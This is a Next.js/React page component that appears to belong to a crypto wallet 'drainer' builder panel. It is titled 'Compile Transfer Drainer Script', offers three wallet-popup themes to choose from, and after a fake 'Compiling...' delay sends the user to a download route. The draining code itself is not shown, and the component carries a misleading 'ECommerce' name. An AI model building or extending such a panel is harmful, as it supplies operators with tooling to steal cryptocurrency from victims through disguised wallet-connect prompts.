"use client";
import dynamic from "next/dynamic";
import React from "react";
import { useState } from "react";
import DefaultLayout from "@/components/Layouts/DefaultLayout";
import styles from "./styles.module.css";

import { useRouter } from 'next/navigation';

const MapOne = dynamic(() => import("@/components/Maps/MapOne"), {
  ssr: false,
});

const ECommerce: React.FC = () => {
  const [isDownloading, setIsDownloading] = useState(false);
  const [selectedNumber, setSelectedNumber] = useState<Number>(1);

  const router = useRouter();

  const handleDownload = () => {
    setIsDownloading(true);
    setTimeout(() => {
      // Trigger the download after 5 seconds
      router.push('/download_transfer');
      setIsDownloading(false); // Reset the state if needed
    }, 5000); // 5000 milliseconds = 5 seconds
  };
  return (
    <DefaultLayout>
      <center>
        <div className="w-[80%] bg-slate-900 rounded-md shadow-4 md:p-17 lg:p-17 p-8 font-medium text-[20px]">
          <p>Compile Transfer Drainer Script</p>
          {!isDownloading && (
            <img src="/images/logo.png" className="w-30 mt-10" />
          )}
          <div>
            {isDownloading && (
              <div className={styles.spinner}></div> // Show spinner while downloading
            )}
          </div>
          <div className="flex flex-col md:flex-row">
            <div className="flex flex-col w-1/3 cursor-pointer" onClick={() => setSelectedNumber(1)}>
              <img src="/images/web3modal/white.png" className={`w-[90%] mt-10 py-2 ${selectedNumber == 1 ? "border-2 rounded-2xl border-white" : ""}`} />
            </div>
            <div className="flex flex-col w-1/3 cursor-pointer" onClick={() => setSelectedNumber(2)}>
              <img src="/images/web3modal/green.png" className={`w-[90%] mt-10 py-2 ${selectedNumber == 2 ? "border-2 rounded-2xl border-white" : ""}`} />
            </div>
            <div className="flex flex-col w-1/3 cursor-pointer" onClick={() => setSelectedNumber(3)}>
              <img src="/images/web3modal/dark.png" className={`w-[90%] mt-10 py-2 ${selectedNumber == 3 ? "border-2 rounded-2xl border-white" : ""}`} />
            </div>
          </div>
          {
            <button
              onClick={handleDownload}
              className="bg-white text-white bg-opacity-10 rounded-2xl p-3  mt-20"
              disabled={isDownloading} // Optional: disable the button while downloading
            >
              {isDownloading ? "Compiling..." : "Compile"}
            </button>
          }
        </div>
      </center>
    </DefaultLayout>
  );
};

export default ECommerce;
